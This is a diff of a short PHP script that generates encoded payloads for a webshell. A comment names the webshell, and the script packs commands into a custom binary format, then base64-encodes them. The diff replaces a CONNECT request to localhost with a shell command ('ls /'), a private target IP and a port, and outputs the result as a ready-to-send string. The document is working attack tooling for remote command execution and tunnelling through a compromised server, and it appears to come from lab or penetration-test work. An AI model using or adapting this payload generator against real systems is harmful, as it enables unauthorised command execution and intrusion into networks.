@@ -1,43 +1,24 @@
 <?php
-
-//offset encoding
-define('BLV_L_OFFSET', 5);
-
-//Encode data in the custom "blv_encode" format
-
 function blv_encode($info) {
     $data = "";
     foreach ($info as $b => $v) {
-        $l = strlen($v) + BLV_L_OFFSET; 
-        $data .= pack("c1N1", $b, $l);  
-        $data .= $v;                    
+        $l = strlen($v) + 5; // Match BLV_L_OFFSET in webshell
+        $data .= pack("c1N1", $b, $l) . $v;
     }
     return $data;
 }
 
-// Command IDs 
-$DATA          = 1;
-$CMD           = 2;
-$MARK          = 3;
-$STATUS        = 4;
-$ERROR         = 5;
-$IP            = 6;
-$PORT          = 7;
-$REDIRECTURL   = 8;
-$FORCEREDIRECT = 9;
+$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-// Define the payload values
-$info = [
-    $CMD => "CONNECT",       // Command: CONNECT, DISCONNECT, READ, FORWARD
-    $IP => "127.0.0.1",      // Target IP 
-    $PORT => "8080",         // Target port
-    $MARK => "123",          // Arbitrary marker
+$payload = [
+    2 => "ls /", // CMD
+    3 => "mark123",  // MARK (unique identifier for session)
+    6 => "192.168.45.139", // Target IP (for CONNECT case)
+    7 => "12345",      // Port (for CONNECT case)
 ];
 
-// Encode the payload
-$encoded = base64_encode(blv_encode($info));
+$encoded = base64_encode(blv_encode($payload));
+$encoded = strtr($encoded, "+/", "-_");
 
-// Output the payload
-echo "Generated Payload: \n";
-echo $encoded . "\n";
-
+echo "Payload: " . $encoded . "\n";
+?>
